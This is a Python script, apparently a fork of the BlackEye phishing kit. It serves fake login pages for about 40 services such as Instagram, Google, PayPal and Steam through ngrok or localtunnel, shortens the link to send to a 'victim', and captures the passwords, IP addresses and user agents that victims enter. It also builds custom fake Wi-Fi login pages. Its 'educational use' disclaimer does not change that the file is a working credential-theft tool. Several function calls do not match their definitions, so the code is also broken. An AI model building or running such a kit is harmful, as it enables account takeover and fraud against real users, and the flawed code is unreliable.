import os
import signal
import subprocess
import sys
import time
import webbrowser

def open_page():
    # Open the GitHub page
    url = "https://github.com/amir13872"
    webbrowser.open(url)

def start_server(server):
    # Start the server for the specified service
    print(f"Starting server for: {server}")
    start(server)

def stop():
    # Stop any running PHP or Node.js processes
    os.system("pkill -f -2 php")
    os.system("killall -2 php")
    os.system("pkill -f -2 node")
    os.system("killall -2 node")

def banner():
    # Print the disclaimer banner
    print(":: Disclaimer: Developers assume no liability and are not    ::")
    print(":: responsible for any misuse or damage caused by BlackEye.  ::")
    print(":: Only use for educational purposes!!                      ::")
    print("::     BLACKEYE By @EricksonAtHome and forked by @amir13872  ::")

def create_page():
    # Create a custom phishing page
    default_cap1 = "Wi-fi Session Expired"
    default_cap2 = "Please login again."
    default_user_text = "Username:"
    default_pass_text = "Password:"
    default_sub_text = "Log-In"

    cap1 = input(f"Title 1 (Default: {default_cap1}): ") or default_cap1
    cap2 = input(f"Title 2 (Default: {default_cap2}): ") or default_cap2
    user_text = input(f"Username field (Default: {default_user_text}): ") or default_user_text
    pass_text = input(f"Password field (Default: {default_pass_text}): ") or default_pass_text
    sub_text = input(f"Submit field (Default: {default_sub_text}): ") or default_sub_text

    with open("sites/create/login.html", "w") as f:
        f.write(f"<!DOCTYPE html>\n<html>\n<body bgcolor=\"gray\" text=\"white\">\n")
        f.write(f"<center><h2> {cap1} <br><br> {cap2} </h2></center><center>\n")
        f.write(f"<form method=\"POST\" action=\"login.php\"><label>{user_text} </label>\n")
        f.write(f"<input type=\"text\" name=\"username\" length=64>\n")
        f.write(f"<br><label>{pass_text}: </label>")
        f.write(f"<input type=\"password\" name=\"password\" length=64><br><br>\n")
        f.write(f"<input value=\"{sub_text}\" type=\"submit\"></form>\n")
        f.write(f"</center>\n<body>\n</html>\n")

def catch_cred(server):
    # Catch and display the credentials
    with open(f"sites/{server}/usernames.txt") as f:
        lines = f.readlines()
        account = lines[0].split(" ")[1]
        password = lines[1].split(":")[1]
        print(f"Account: {account}")
        print(f"Password: {password}")
        with open(f"sites/{server}/saved.usernames.txt", "a") as saved:
            saved.writelines(lines)
        print(f"Saved: sites/{server}/saved.usernames.txt")
    stop()

def get_credentials(server):
    # Wait for credentials to be captured
    print("Waiting for credentials ...")
    while True:
        if os.path.exists(f"sites/{server}/usernames.txt"):
            print("Credentials Found!")
            catch_cred(server)
        time.sleep(1)

def catch_ip(server):
    # Catch and display the IP address and User-Agent
    with open(f"sites/{server}/ip.txt") as f:
        lines = f.readlines()
        ip = lines[0].split(" ")[1].strip()
        ua = lines[1].split('"')[1]
        print(f"IP: {ip}")
        print(f"User-Agent: {ua}")
        with open(f"sites/{server}/saved.ip.txt", "a") as saved:
            saved.writelines(lines)
        print(f"Saved: sites/{server}/saved.ip.txt")
    get_credentials(server)

def start():
    # Choose the tunneling method
    print("1. Localtunnel")
    print("2. Ngrok")
    host = input("Choose the tunneling method: ")
    if host == "1":
        start_localtunnel()
    elif host == "2":
        start_ngrok()

def start_localtunnel(server):
    # Start the Localtunnel server
    os.system(f"rm -rf sites/{server}/ip.txt")
    os.system(f"rm -rf sites/{server}/usernames.txt")
    print("Starting php server...")
    os.system(f"cd sites/{server} && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
    time.sleep(2)
    print("Starting localtunnel server...")
    os.system(f"lt --port 5555 --subdomain wmw-{server}-com > /dev/null 2>&1 &")
    time.sleep(4)
    print(f"Send this link to the Victim: https://wmw-{server}-com.loca.lt")
    short_link = subprocess.getoutput(f"wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-{server}-com.loca.lt")
    print(f"Use shortened link instead: {short_link}")
    check_found(server)

def start_ngrok(server):
    # Start the Ngrok server
    os.system(f"rm -rf sites/{server}/ip.txt")
    os.system(f"rm -rf sites/{server}/usernames.txt")
    print("Starting php server...")
    os.system(f"cd sites/{server} && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
    time.sleep(2)
    print("Starting ngrok server...")
    os.system("./ngrok http 5555 > /dev/null 2>&1 &")
    time.sleep(10)
    ngrok_url = subprocess.getoutput("curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url'")
    print(f"Send this link to the Victim: {ngrok_url}")
    short_link = subprocess.getoutput(f"wget -q -O - http://tinyurl.com/api-create.php?url={ngrok_url}")
    print(f"Use shortened link instead: {short_link}")
    check_found(server)

def check_found(server):
    # Wait for the victim to open the link
    print("Waiting for victim to open the link ...")
    while True:
        if os.path.exists(f"sites/{server}/ip.txt"):
            print("IP Found!")
            catch_ip(server)
        time.sleep(1)

def menu():
    # Display the menu options
    print("[01] Instagram      [17] DropBox        [33] eBay")
    print("[02] Facebook       [18] Line           [34] Amazon")
    print("[03] Snapchat       [19] Shopify        [35] iCloud")
    print("[04] Twitter        [20] Messenger      [36] Spotify")
    print("[05] Github         [21] GitLab         [37] Netflix")
    print("[06] Google         [22] Twitch         [38] Reddit")
    print("[07] Origin         [23] MySpace        [39] StackOverflow")
    print("[08] Yahoo          [24] Badoo          [40] Custom")
    print("[09] Linkedin       [25] VK")
    print("[10] Protonmail     [26] Yandex")
    print("[11] Wordpress      [27] devianART")
    print("[12] Microsoft      [28] Wi-Fi")
    print("[13] IGFollowers    [29] PayPal")
    print("[14] Pinterest      [30] Steam")
    print("[15] Apple ID       [31] Tiktok")
    print("[16] Verizon        [32] Playstation")
    print("[41] Binance Email Support")
    print("[42] Ngrok")

    option = input("Choose an option: ")

    if option == "1":
        start_server("instagram")
    elif option == "2":
        start_server("facebook")
    elif option == "3":
        start_server("snapchat")
    elif option == "4":
        start_server("twitter")
    elif option == "5":
        start_server("github")
    elif option == "6":
        start_server("google")
    elif option == "7":
        start_server("origin")
    elif option == "8":
        start_server("yahoo")
    elif option == "9":
        start_server("linkedin")
    elif option == "10":
        start_server("protonmail")
    elif option == "11":
        start_server("wordpress")
    elif option == "12":
        start_server("microsoft")
    elif option == "13":
        start_server("instafollowers")
    elif option == "14":
        start_server("pinterest")
    elif option == "15":
        start_server("apple")
    elif option == "16":
        start_server("verizon")
    elif option == "17":
        start_server("dropbox")
    elif option == "18":
        start_server("line")
    elif option == "19":
        start_server("shopify")
    elif option == "20":
        start_server("messenger")
    elif option == "21":
        start_server("gitlab")
    elif option == "22":
        start_server("twitch")
    elif option == "23":
        start_server("myspace")
    elif option == "24":
        start_server("badoo")
    elif option == "25":
        start_server("vk")
    elif option == "26":
        start_server("yandex")
    elif option == "27":
        start_server("devianart")
    elif option == "28":
        start_server("wifi")
    elif option == "29":
        start_server("paypal")
    elif option == "30":
        start_server("steam")
    elif option == "31":
        start_server("tiktok")
    elif option == "32":
        start_server("playstation")
    elif option == "33":
        start_server("shopping")
    elif option == "34":
        start_server("amazon")
    elif option == "35":
        start_server("icloud")
    elif option == "36":
        start_server("spotify")
    elif option == "37":
        start_server("netflix")
    elif option == "38":
        start_server("reddit")
    elif option == "39":
        start_server("stackoverflow")
    elif option == "40":
        create_page()
        start_server("create")
    elif option == "41":
        open_page()
    elif option == "42":
        start_server("ngrok")
    else:
        print("Invalid option!")
        menu()

if __name__ == "__main__":
    # Handle SIGINT signal to stop the server
    signal.signal(signal.SIGINT, lambda sig, frame: (print("\n"), stop(), sys.exit(1)))
    banner()
    menu()
